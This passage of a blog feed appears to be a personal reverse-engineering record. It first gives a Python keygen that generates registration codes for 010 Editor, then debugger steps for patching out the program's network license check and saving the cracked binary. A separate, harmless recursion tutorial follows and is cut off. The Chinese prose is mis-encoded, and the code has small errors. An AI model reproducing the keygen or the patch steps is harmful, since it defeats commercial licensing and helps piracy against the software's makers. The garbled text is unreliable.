class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span> eax % <span class="hljs-number">11</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (eax / <span class="hljs-number">0xb</span> &lt;= <span class="hljs-number">0x3E8</span>):<br>            <span class="hljs-keyword">return</span> i, eax // <span class="hljs-number">0xb</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base_name_calc</span>(<span class="hljs-params">username, a2, a3, a4</span>):</span><br>    result = <span class="hljs-number">0</span><br>    username_len = <span class="hljs-built_in">len</span>(username)<br>    <span class="hljs-keyword">if</span> username_len &gt; <span class="hljs-number">0</span>:<br>        v7 = <span class="hljs-number">0</span><br>        v9 = (<span class="hljs-number">0xf</span> * a4) &amp; <span class="hljs-number">0xff</span><br>        v10 = (<span class="hljs-number">0x11</span> * a3) &amp; <span class="hljs-number">0xff</span><br>        v11 = <span class="hljs-number">0</span><br>        v12 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v7 &lt; username_len:<br>            upper_char = <span class="hljs-built_in">ord</span>(username[v7].upper())  <span class="hljs-comment"># upper_char = v13</span><br>            v14 = (result + tables[upper_char]) &amp; <span class="hljs-number">0xffffffff</span>    <span class="hljs-comment"># é˜²æ­¢æº¢å‡º</span><br>            <span class="hljs-keyword">if</span> a2:<br>                v15 = (tables[v9] + tables[v10] + tables[upper_char+<span class="hljs-number">0x2f</span>] * (v14 ^ tables[upper_char+<span class="hljs-number">0xd</span>])) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v11<br>            <span class="hljs-keyword">else</span>:       <span class="hljs-comment"># å…¶å®è¿™ä¸ªå¯ä»¥å¿½ç•¥ï¼Œå› ä¸ºa2å§‹ç»ˆä¸ºçœŸ</span><br>                v15 = (tables[v9] + tables[v10] + tables[upper_char + <span class="hljs-number">0x17</span>] * (v14 ^ tables(upper_char+<span class="hljs-number">0x3f</span>))) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v12<br>            result = tables[v16]+v15<br>            v7 = v7 + <span class="hljs-number">1</span><br>            v11 = (v11 + <span class="hljs-number">19</span>) % <span class="hljs-number">0x100</span><br>            v10 = (v10 + <span class="hljs-number">9</span>) % <span class="hljs-number">0x100</span><br>            v9 = (v9 + <span class="hljs-number">13</span>) % <span class="hljs-number">0x100</span><br>            v12 = (v12 + <span class="hljs-number">7</span>) % <span class="hljs-number">0x100</span><br>        <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> result<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input a username:&quot;</span>)<br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">8</span><br>    k[<span class="hljs-number">3</span>] = <span class="hljs-number">0x9c</span>     <span class="hljs-comment"># 0x9cç‰ˆæœ¬æ³¨å†Œç çš„ç®—æ³•</span><br>    v8,v9 = guess_quo()<br>    result = base_name_calc(name, <span class="hljs-literal">True</span>, <span class="hljs-number">0</span>, v9)<br>    k[<span class="hljs-number">4</span>] = result &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">5</span>] = (result &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">6</span>] = (result &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">7</span>] = (result &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">2</span>] = k[<span class="hljs-number">5</span>] ^ (v8 % <span class="hljs-number">0x100</span>)  <span class="hljs-comment"># å›é¡¾ä¸€ä¸‹ä¸Šé¢å–éšæœºå€¼içš„æ—¶å€™</span><br>    k[<span class="hljs-number">1</span>] = k[<span class="hljs-number">7</span>] ^ (v8 &gt;&gt; <span class="hljs-number">8</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k[<span class="hljs-number">0</span>] = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">256</span>)<br>        v10 = (((k[<span class="hljs-number">6</span>] ^ k[<span class="hljs-number">0</span>]) ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">61</span>) % <span class="hljs-number">0x100</span>) ^ <span class="hljs-number">0xa7</span><br>        <span class="hljs-keyword">if</span> v10 &gt;= <span class="hljs-number">10</span>:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):  <span class="hljs-comment"># ä½¿è¾“å‡ºæ›´å®Œç¾</span><br>        <span class="hljs-keyword">if</span> k[i] &lt; <span class="hljs-number">16</span>:<br>            k[i] = <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>].upper()<br>        <span class="hljs-keyword">else</span>:<br>            k[i] = <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>].upper()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Password: %s%s-%s%s-%s%s-%s%s&#x27;</span> % (k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">4</span>], k[<span class="hljs-number">5</span>], k[<span class="hljs-number">6</span>], k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<span class="hljs-comment"># å…¥å£</span><br>   main()<br></code></pre></td></tr></table></figure><h4 id="4-å»é™¤ç½‘ç»œéªŒè¯"><a href="#4-å»é™¤ç½‘ç»œéªŒè¯" class="headerlink" title="4.å»é™¤ç½‘ç»œéªŒè¯"></a>4.å»é™¤ç½‘ç»œéªŒè¯</h4><p>è¿™å—ï¼Œå¦‚æœä¸æ˜¯çœ‹æ–‡ç« çš„è¯ï¼Œæˆ‘è‡ªå·±æ¥æŒ‡å®šä¸ä¼šå†™ï¼Œä½œä¸ºèœé¸¡çš„æˆ‘æ ¹æœ¬æƒ³ä¸åˆ°å¥½å§</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/42.png"></p><p>ä¸è¿‡æ—¢ç„¶çœ‹åˆ°äº†å¤§ä½¬çš„æ“ä½œï¼Œé‚£å°±å­¦ä¸€ä¸‹ï¼Œè™½ç„¶å¹³å¸¸æ¡åƒåœ¾ç”¨ä¸åˆ°ï¼Œä½†å¤šå­¦ç‚¹æ€»å½’ä¸æ˜¯é”™çš„ã€‚</p><p>è¿™é‡Œç”±äºè™šæ‹Ÿæœºçš„ç½‘ç»œæœ‰ç‚¹å°é—®é¢˜ï¼Œå¯¼è‡´è™šæ‹Ÿæœºä¸­ä¸€ç›´ä¸è°ˆç½‘ç»œæ ¡éªŒé‚£ä¸ªé”™è¯¯ä½ç½®ï¼Œå“¦ï¼è¿™ä¹ˆçœ‹æˆ‘å‰é¢çš„æ‰€æœ‰åˆ†æè¿‡ç¨‹å…¨éƒ¨åœ¨æ— ç½‘æƒ…å†µä¸‹è¿›è¡Œï¼Œéš¾åº¦æœ‰æ‰€é™ä½ï¼Œå°±è¿™è¿˜çœ‹äº†é‚£ä¹ˆä¹…ï¼ŒçœŸæ˜¯èœä¸­èœã€‚è™šæ‹Ÿæœºä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½åœ¨ç‰©ç†æœºä¸­è¿›è¡Œæ“ä½œã€‚æ‰“å¼€010Editorï¼Œxdbgè¿›è¡ŒæŒ‚è½½ï¼Œå°†ç¨‹åºèµ°åˆ°å¦‚ä¸‹ä½ç½®</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/43.png"></p><p>ç¨‹åºæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸¤ä¸ªå‡½æ•°éƒ½è¦è¿”å›0x2D(åˆ«é—®ï¼Œé—®å°±æ˜¯æ‹¿ä¸ªæ­£ç¡®çš„æ³¨å†Œç å»è™šæ‹Ÿæœºè¯•ä¸€ä¸‹)ï¼Œè¿™é‡Œç¨‹åºè¿”å›0x113ï¼Œæ˜¯ä¸ªé—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹ï¼Œç¨‹åºç»§ç»­å¾€ä¸‹èµ°ï¼Œèµ°åˆ°ä¸€ä¸ªjnsï¼Œè¿™é‡Œéœ€è¦çœ‹ä¸€ä¸‹</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/44.png"></p><p>OKï¼Œåˆ†æç»“æŸï¼Œç»§ç»­å¾€ä¸‹èµ°ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è·Ÿæˆ‘ä»¬æƒ³çš„ä¸€æ ·ï¼Œæœç„¶é¢„æœŸä¸€æ ·ï¼Œç¨‹åºèµ°åˆ°å¦‚ä¸‹å›¾ä½ç½®é”™è¯¯ä¿¡æ¯å°±è·³å‡ºæ¥äº†ï¼Œæ‰€ä»¥ï¼Œé‚£ä¸ªjnsä¸èƒ½è·³ï¼Œè·³äº†å°±GG</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/45.png"></p><p>è¿™é‡Œæœ‰è¿‡ä¸€æ¬¡å°†è·³è½¬æ³¨é‡Šæˆnopå°è¯•ï¼Œç¨‹åºåœ¨æ¯æ¬¡æ‰“å¼€çš„æ—¶å€™éƒ½ä¼šè·³å‡ºéªŒè¯é¡µé¢ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥çœ‹jnsä¸Šé¢çš„é‚£ä¸ªå‡½æ•°ã€‚jnsä¸Šé¢æ˜¯ä¸ª<code>test eax,eax</code>ï¼Œåªè¦eaxçš„å€¼ä¸ä¸º0ï¼Œjnså°±ä¸ä¼šè·³ã€‚</p><p>é‡æ–°åŠ è½½ç¨‹åºï¼Œè¿›å…¥<code>call 010editor.7FF611CA94AD</code>ä½ç½®ï¼Œå¼€å§‹å•æ­¥ï¼Œèµ°äº†ä¸€åœˆå‘ç°æ²¡æœ‰æ‰¾åˆ°èƒ½å¤Ÿç›´æ¥æ§åˆ¶eaxå€¼çš„ä½ç½®ï¼Œæ—¢ç„¶è¿™æ ·ï¼Œé‚£å°±ç›´æ¥åœ¨ç¨‹åºçš„æœ€åï¼ŒåŠ ä¸ª<code>mov eax,0x2</code>ï¼Œå› ä¸ºè¦æ±‚çš„æ˜¯å¤§äº0å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥åªè¦æ˜¯ä¸ªå¤§äº0çš„æ•°å°±è¡Œ</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/46.png"></p><p>æ”¹å®Œä¹‹åç¨‹åºç»§ç»­å¾€ä¸‹èµ°ï¼Œè·³è½¬æ»¡è¶³ï¼Œä½†æ˜¯æœ‰ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹å°±æ˜¯ï¼Œæ¥ä¸‹æ¥è¿˜æœ‰æ¯”è¾ƒ<code>cmp ebx,0xDB</code>ï¼Œè¦æ˜¯ebxä¸ä¸º0xDBï¼Œåˆ™ä¼šæŠ¥æ³¨å†Œç é”™è¯¯ã€‚åˆ«é—®ä¸ºå•¥çŸ¥é“çš„ï¼Œèµ°äº†å¾ˆå¤šéï¼Œèµ°çš„äººéƒ½éº»äº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/47.png"></p><p>è¿™é‡Œå°†0x113æ›´æ”¹ä¸º0xDBï¼Œå·²ç»æœ‰ç»éªŒäº†ï¼Œç›´æ¥è¿›å…¥è¯¥å‡½æ•°æ›´æ”¹ä¸€ä¸‹è¿”å›çš„ä½ç½®å°±å¯ä»¥äº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/48.png"></p><p>é‡æ–°è½½å…¥ç¨‹åºï¼Œç„¶åè·Ÿç€ä¿®æ”¹ä¹‹åçš„ç¨‹åºèµ°ä¸€ä¸‹ï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸèµ°åˆ°æ³¨å†Œç æ­£ç¡®çš„ä½ç½®ï¼Œä¹Ÿæ²¡æœ‰ç½‘ç»œéªŒè¯</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/49.png"></p><p>æœ€åå°±æ˜¯ä¿®æ”¹è¡¥ä¸ï¼Œä¿å­˜ä¿®æ”¹çš„æ–‡ä»¶ï¼Œå†ç”¨ä¿®æ”¹åçš„æ–‡ä»¶æ›¿æ¢æ‰æºæ–‡ä»¶å°±ç®—æ˜¯å½»åº•å®Œå·¥ï¼Œå½“ç„¶ä¸æ¨èæ›¿æ¢æºæ–‡ä»¶ï¼Œå¯ä»¥æ¢ä¸ªæ–‡ä»¶åï¼Œç„¶åæ›´æ”¹ä¸€ä¸‹å¿«æ·æ–¹å¼ä¸­çš„ç›®æ ‡å°±OKã€‚å®Œå·¥ï¼</p><h4 id="5-æ€»ç»“"><a href="#5-æ€»ç»“" class="headerlink" title="5.æ€»ç»“"></a>5.æ€»ç»“</h4><p>è¿™ç¯‡æ–‡ç« ï¼Œå¤§éƒ¨åˆ†çš„æ€è·¯æ¥æºäºå‚è€ƒé“¾æ¥ä¸­çš„ä¸‰ç¯‡æ–‡ç« ï¼Œåœ¨è‡ªå·±è°ƒè¯•ä»¥åŠæ³¨å†Œæœºçš„ç¼–å†™è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ç§ç§é—®é¢˜ï¼Œä¹Ÿæ˜¯ä¸€ç‚¹ç‚¹çš„è§£å†³ï¼Œä¸€ç‚¹ç‚¹çš„è‡ªå·±å°è¯•ï¼Œå› ä¸ºæœ‰å­¦ä¹ åˆ°ä¸œè¥¿ï¼Œæ•…å°†æ­¤æ¬¡å­¦ä¹ è¿‡ç¨‹è®°å½•ä¸‹æ¥ï¼Œå¯ä»¥è¯´æŠ„è¢­ï¼Œä½†è¿™æ¬¡çš„æŠ„è¢­ç®—æ˜¯æŠ„æ˜ç™½äº†ã€‚è¯´ç™½äº†ï¼Œè¿˜æ˜¯å¤ªèœäº†</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/50.png"></p><h4 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h4><p><a href="https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2">https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2</a></p><p><a href="https://www.52pojie.cn/thread-1557588-1-1.html">https://www.52pojie.cn/thread-1557588-1-1.html</a></p><p><a href="https://blog.csdn.net/weixin_43272781/article/details/101173877">https://blog.csdn.net/weixin_43272781/article/details/101173877</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>è¢«è¿«çš„è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>recursioné€’å½’ç®—æ³•</title>
    <link href="/2022/01/22/recursion/"/>
    <url>/2022/01/22/recursion/</url>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åˆ·codewarsçš„æ—¶å€™ï¼Œç¢°åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²çš„å…¨æ’åˆ—ï¼Œemmmï¼Œä¸ä¼šï¼Œç„¶åå°±å»å¯»æ‰¾äº†ä¸€ä¸‹è§£å†³æ–¹æ³•ï¼Œå‘ç°æ˜¯ç”¨é€’å½’è¿›è¡Œè§£å†³(å¯èƒ½æœ‰å…¶ä»–æ–¹æ³•ï¼Œä½†æ²¡å‘ç°ï¼Œè°ƒç”¨åº“å‡½æ•°çš„ä¸ç®—)ã€‚ç„¶åçœ‹äº†åŠå¤©åˆ«äººçš„æ€è·¯å‘ç°å§‹ç»ˆæœ‰ç‚¹è¿·ç³Šï¼Œå°±é‡æ–°å­¦ä¹ äº†ä¸€ä¸‹é€’å½’(æˆ‘è®°ç€æˆ‘ä»¥å‰ä¼šï¼Œemmm,å¯èƒ½ä¹Ÿæ˜¯ä¼šçš„ä¸å’‹æ»´)ã€‚</p><h3 id="é€’å½’ç®—æ³•ç®€è¿°"><a href="#é€’å½’ç®—æ³•ç®€è¿°" class="headerlink" title="é€’å½’ç®—æ³•ç®€è¿°"></a>é€’å½’ç®—æ³•ç®€è¿°</h3><p>**é€’å½’ç®—æ³• ** æ˜¯æŒ‡ä¸€ç§é€šè¿‡é‡å¤å°†é—®é¢˜åˆ†è§£ä¸ºåŒç±»çš„å­é—®é¢˜è€Œè§£å†³é—®é¢˜çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯æŒ‡åœ¨å®šä¹‰çš„å‡½æ•°ä¸­è°ƒç”¨å‡½æ•°è‡ªèº«çš„æ–¹æ³•ã€‚é€’å½’ç®—æ³•å®é™…ä¸Šåˆ†ä¸ºä¸¤å±‚æ„æ€ï¼Œä¸€ä¸ªâ€é€’â€ï¼Œä¸€ä¸ªâ€å½’â€ï¼Œè¿™ä¹Ÿæ˜¯åœ¨åç»­ä½¿ç”¨é€’å½’ç®—æ³•ä¸­çš„é‡è¦åœ°æ–¹ã€‚</p><p>æœ¬æ–‡ä¸ä¼šå¯¹é€’å½’çš„æ—¶é—´å¤æ‚åº¦è¿›è¡Œåˆ†æï¼Œå› ä¸ºä¸ä¼šï¼Œåªæ˜¯é€šè¿‡å‡ ä¸ªä¾‹å­æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨é€’å½’ç®—æ³•ã€‚</p><p>**é€’å½’ç®—æ³• ** é€šå¸¸ç”¨æ¥è§£å†³ç»“æ„è‡ªç›¸ä¼¼çš„é—®é¢˜ã€‚æ‰€è°“ç»“æ„è‡ªç›¸ä¼¼ï¼Œæ˜¯æŒ‡æ„æˆåŸé—®é¢˜çš„å­é—®é¢˜ä¸åŸé—®é¢˜åœ¨ç»“æ„ä¸Šç›¸ä¼¼ï¼Œå¯ä»¥ç”¨ç±»ä¼¼çš„æ–¹æ³•è§£å†³ã€‚è€Œåœ¨ä½¿ç”¨é€’å½’æ—¶ï¼Œåˆ™æ˜¯é€šè¿‡å°†é—®é¢˜åˆ†è§£æˆç›¸åŒç±»å‹çš„å­é—®é¢˜ï¼Œç„¶åå†é€šè¿‡å­é—®é¢˜çš„ç»“æœå†åæ¨å‡ºé—®é¢˜çš„ç»“æœã€‚</p><p><strong>é€’å½’ç®—æ³•</strong> çš„ä¸‰æ­¥ï¼š</p><ol><li>é€’å½’å‡½æ•°çš„å‚æ•°ä»¥åŠè¿”å›å€¼</li><li>ç¡®å®šç»ˆæ­¢æ¡ä»¶</li><li>å•å±‚é€’å½’çš„é€»è¾‘</li></ol><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><h4 id="ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜"><a href="#ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜" class="headerlink" title="ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜"></a>ä¸¾ä¾‹1ï¼šnçš„é˜¶ä¹˜</h4><p>å…ˆå¯¹nçš„é˜¶ä¹˜è¿›è¡Œåˆ†æ</p><p><code>n! = n * (n-1) * (n-2) * Â·Â·Â·Â·Â·Â·* 2 * 1</code>ï¼Œç›¸å½“äºä¸‹å¼</p><p><img src="/2022/01/22/recursion/1.png" alt="img"></p><p>å‡è®¾n=1ï¼Œåˆ™nçš„é˜¶ä¹˜ç­‰äº1ï¼›n=2æ—¶ï¼Œnçš„é˜¶ä¹˜ç­‰äº2*1=2</p><p>é¦–å…ˆç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°ä»¥åŠè¿”å›å€¼ï¼Œæ—¢ç„¶æ˜¯nçš„é˜¶ä¹˜ï¼Œé‚£å‚æ•°è‚¯å®šæ¯«æ— ç–‘é—®æ˜¯n(é€’å½’å‡½æ•°çš„å‚æ•°ï¼Œå¦‚æœåˆšå¼€å§‹ä¸èƒ½ç¡®å®šæ‰€æœ‰ï¼Œåˆ™å¯ä»¥åœ¨åç»­è¿›è¡Œè¡¥å……ï¼Œä¸å½±å“çš„ã€‚)ï¼Œå†è¯´è¿”å›å€¼ï¼Œæ±‚nçš„é˜¶ä¹˜ï¼Œè¿”å›å€¼æŒ‡å®šæ˜¯é˜¶ä¹˜çš„ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ±‚nçš„é˜¶ä¹˜</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼Œå·²çŸ¥<code>1!</code>== 1ï¼Œåˆ™å¯ä»¥ç¡®å®šå½“n==1æ—¶ï¼Œè¿™ä¸ªé€’å½’å°±å¯ä»¥ç»ˆæ­¢äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘ï¼Œå·²çŸ¥<code>n! = n * (n-1) * (n-2) * Â·Â·Â·Â·Â·Â·* 2 * 1</code>ï¼Œä½¿ç”¨f(n)æ¥è¡¨ç¤ºnçš„é˜¶ä¹˜ï¼Œ<code>f(n)==n*f(n-1)</code>ï¼Œå½“n-1ç­‰äº1æ—¶ï¼Œåˆ™å¯ä»¥ç›´æ¥è¿”å›å·²çŸ¥çš„ç»“æœã€‚åˆ™å‡½æ•°å°±å¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è¦æ˜¯æ²¡ç†è§£ï¼Œå…ˆå‡è®¾n=2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*f(<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#å·²çŸ¥f(1)==1ï¼Œåˆ™ç›¸å½“äºç›´æ¥return 2*1</span><br></code></pre></td></tr></table></figure><p>å†çœ‹n=3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">3</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*f(<span class="hljs-number">3</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#return 3*f(2),è°ƒç”¨f()ï¼Œæ±‚f(2),ä¹Ÿå°±å†è¿”å›åˆ°ä¸Šé¢çš„å¼å­ä¸­</span><br></code></pre></td></tr></table></figure><p>å†å‡è®¾n=5ï¼Œåˆ™å‡½æ•°å…·ä½“çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">f(<span class="hljs-number">5</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*f(<span class="hljs-number">4</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*f(<span class="hljs-number">3</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*f(<span class="hljs-number">2</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*(<span class="hljs-number">3</span>*(<span class="hljs-number">2</span>*f(<span class="hljs-number">1</span>))))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*f(<span class="hljs-number">5</span>-<span class="hljs-number">4</span>))))<span class="hljs-comment">#ä¸ŠåŠéƒ¨åˆ†ä¸ºé€’ï¼Œä¸‹åŠéƒ¨åˆ†ä¸ºå½’</span><br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">3</span>)*<span class="hljs-number">1</span>)))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*((<span class="hljs-number">5</span>-<span class="hljs-number">2</span>)*(<span class="hljs-number">2</span>))<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*((<span class="hljs-number">5</span>-<span class="hljs-number">1</span>)*(<span class="hljs-number">6</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">5</span>*(<span class="hljs-number">24</span>)<br>f(<span class="hljs-number">5</span>)=<span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p>åˆ™å¯ä»¥å¾—å‡ºæœ€ç»ˆç¨‹åºï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h4 id="ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—"><a href="#ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—" class="headerlink" title="ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—"></a>ä¸¾ä¾‹2ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ—</h4><p>1ã€1ã€2ã€3ã€5ã€8ã€13ã€21ã€34Â·Â·Â·Â·Â·Â·Â·  ç®€å•ç‚¹è¯´å°±æ˜¯ç¬¬né¡¹çš„å€¼ä¸ºå‰ä¸¤é¡¹ä¹‹å’Œ</p><p>é¦–å…ˆå¯¹è¯¥æ•°åˆ—è¿›è¡Œåˆ†æï¼Œç”±äºç¬¬ä¸€é¡¹å’Œç¬¬äºŒé¡¹æ²¡æœ‰å‰ä¸¤é¡¹ï¼Œåˆ™å¯ä»¥çŸ¥é“å…¶å€¼ç›´æ¥ä¸º1ï¼Œå‡è®¾f(n)ä¸ºç¬¬né¡¹çš„å€¼ï¼Œåˆ™å¯ä»¥æ¨å‡ºä¸‹å¼ï¼š</p><p><img src="/2022/01/22/recursion/2.png" 